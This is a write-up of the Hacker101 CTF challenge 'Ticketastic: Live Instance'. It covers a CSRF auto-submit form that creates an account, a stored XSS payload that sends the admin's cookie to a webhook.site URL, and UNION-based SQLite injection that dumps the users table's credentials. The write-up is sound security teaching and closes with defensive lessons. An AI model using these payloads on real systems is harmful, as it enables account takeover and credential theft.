# Ticketastic: Live Instance — Writeup (2/2)

**Difficulty:** Moderate  
**Category:** Web (CSRF, SQL Injection)  
**Flags:** 2/2 (complete)  
**Platform:** Hacker101 CTF  
**Hint:** "This level and the Ticketastic demo instance are running the same code"

---

## About the Challenge

**Context:** A support ticket system. Users create tickets, admins reply. The "live instance" has no public registration link — but the user creation endpoint exists and has no CSRF protection. The SQLite database is accessed via string concatenation on the ticket ID.

**What you face:** An application seemingly without public registration, tickets with numeric IDs, and an admin who periodically reads tickets (simulated by a bot).

**Vulnerabilities exploited:**
- CSRF (CWE-352) — `addUser` endpoint accepts GET without a CSRF token, allowing account creation by third parties
- Stored XSS (CWE-79) — links and scripts in tickets are rendered without sanitization
- SQL Injection (CWE-89) — `/ticket?id=` uses `%s % user_input` directly in the SQLite query

**What you learn:**
- CSRF without tokens allows any site to create resources on the victim server
- Stored XSS in ticket systems can compromise admins who open the tickets
- Even "live" instances share vulnerabilities from the "demo" codebase
- `sqlite_master` replaces `information_schema` for schema enumeration in SQLite
- Always validate the HTTP method and add CSRF tokens to state-modifying endpoints

---

## Objective

Exploit CSRF to create an admin account and SQL injection to extract sensitive data.

## Context

This instance and the "Ticketastic Demo Instance" share the same code. The user creation CSRF vulnerability seen in the demo is also present here. The difference is that there is no public registration link — access is only possible via CSRF.

---

## Flag 0 — CSRF for Account Creation + Stored XSS in Tickets

**Vulnerabilities:** CSRF on the user creation endpoint + clickable links in tickets.

### Step 1: Discover the user creation endpoint

In the Ticketastic Demo Instance (same code), the `addUser` endpoint accepts GET without a CSRF token:
```
/?addUser=1&username=hacker&password=hacker123
```

### Step 2: Create an account via CSRF

Access directly:
```
https://<INSTANCE>/addUser?username=attacker&password=attacker123
```

If the endpoint is not directly accessible, create an HTML page with auto-submit:
```html
<form action="https://<INSTANCE>/addUser" method="GET">
  <input name="username" value="attacker">
  <input name="password" value="attacker123">
</form>
<script>document.forms[0].submit()</script>
```

### Step 3: Log in with the new account

Use `attacker:attacker123` to log in.

### Step 4: Create a ticket with a malicious link

Create a ticket containing an HTML link that an admin might click:
```html
<a href="https://webhook.site/TOKEN">Click here</a>
```

When the admin (bot) opens the ticket and clicks the link, the webhook captures the session or the flag.

**Alternative (Stored XSS):**
```html
<script>document.location='https://webhook.site/TOKEN?c='+document.cookie</script>
```

The flag appears when the admin bot accesses the ticket.

---

## Flag 1 — SQL Injection on the Ticket ID

**Vulnerability:** SQL injection in the `id` parameter of the ticket view endpoint.

### Step 1: Detect the injection

Access:
```
/ticket?id=1'
```

SQLite error response:
```
File "./main.py", line 78, in ticket
    cur.execute('SELECT title, body, reply FROM tickets WHERE id=%s' % request.args['id'])
```

The code uses `%s % user_input` directly in the query — classic injection.

### Step 2: Enumerate columns

```
/ticket?id=1 UNION SELECT 1,2,3--
```

3 columns confirmed (title, body, reply).

### Step 3: Extract tables

```
/ticket?id=0 UNION SELECT group_concat(name),2,3 FROM sqlite_master WHERE type='table'--
```

Returns: `tickets,users`

### Step 4: Extract data from the users table

```
/ticket?id=0 UNION SELECT group_concat(username||':'||password),2,3 FROM users--
```

The flag is in the users table data.

**Alternative — extract users table columns:**

```
/ticket?id=0 UNION SELECT group_concat(sql),2,3 FROM sqlite_master WHERE name='users'--
```

---

## Attack Summary

```
FLAG 0: CSRF → create account → login → ticket with link/XSS → admin clicks → flag
FLAG 1: SQL injection on /ticket?id=1' → UNION SELECT from users table → flag
```

## Lessons Learned

1. **CSRF** without tokens allows third parties to create accounts
2. **Stored XSS** in tickets + an admin that opens tickets = session/flag theft
3. **SQL injection via string formatting** (`%s % input`) is critical — use parameterized queries
4. **SQLite sqlite_master** for schema enumeration when `information_schema` is unavailable
5. **Shared codebase between instances** means shared vulnerabilities — never assume "demo" and "live" have different security
